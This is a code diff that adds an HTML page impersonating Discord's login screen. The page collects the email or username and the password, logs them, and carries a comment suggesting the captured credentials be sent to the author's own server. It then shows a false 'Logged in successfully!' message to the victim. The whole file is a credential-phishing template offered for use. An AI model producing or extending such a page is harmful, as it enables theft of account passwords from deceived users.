@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord Login</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background-color: #2f3136;
+            color: white;
+            font-family: Arial, sans-serif;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background-color: #111;
+            padding: 30px;
+            border-radius: 10px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #7289da;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #677bc4;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Discord Login</h2>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Email or Username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <p id="message" style="color: red; margin-top: 15px;"></p>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function (e) {
+            e.preventDefault();
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            // Send the data to your server (you can use a free service like RapidAPI or just log it)
+            console.log("Username:", username);
+            console.log("Password:", password);
+
+            // Optional: Show a message
+            document.getElementById("message").innerText = "Logged in successfully!";
+        });
+    </script>
+</body>
+</html>
